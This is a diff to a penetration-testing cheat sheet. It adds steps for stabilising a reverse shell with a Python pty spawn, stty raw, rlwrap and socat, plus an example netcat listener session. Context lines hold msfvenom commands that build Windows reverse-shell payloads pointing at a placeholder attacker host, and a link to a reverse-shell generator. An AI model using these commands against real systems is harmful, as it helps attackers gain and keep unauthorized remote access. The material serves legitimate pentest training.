@@ -49,6 +49,67 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
+#### Shell Stabilisation
+
+##Technique 01: Python
+```
+➤ Step 01 : uses Python to spawn a better featured bash shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+➤ Step 02: this will give us access to term commands such as clear
+export TERM=xterm
+
+➤ Step 03: background the shell using Ctrl + Z
+CRTL+Z
+
+➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+stty raw -echo; fg
+
+Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
+
+➤ Example: 
+kiosec@lab:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.0.0.1] from (unknown) [10.1.1.1] 43298
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+user@box:~$ export TERM=xterm
+export TERM=xterm
+user@box:~$ ^Z
+[1]+ Stopped            sudo nc -lvnp 443
+kiosec@lab:~$ stty rauw -echo; fg
+nc -lvnp 443
+
+user@box:~$ whoami
+user
+user@box:~$ ^C
+user@box:~$
+```
+
+## Technique 02: Rlwrap
+rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
+This technique is particularly useful with the Windows shell.
+```
+➤ Step 01: Install rlwrap (not installed by default on the kali)
+apt install rlwrap
+
+➤ Step 02: Invoke the listener.
+rlwrap nc -lnvp <port> 
+
+[additional steps for Linux target]
+➤ Step 03: background the shell using Ctrl + Z
+CRTL+Z
+
+➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+stty raw -echo; fg
+```
+
+Technique 3: Socat
+Restricted to Linux target
+```
+➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
+➤ Step 02: Use Socat
+```
 
 #### Online Generator
 <https://www.revshells.com/>
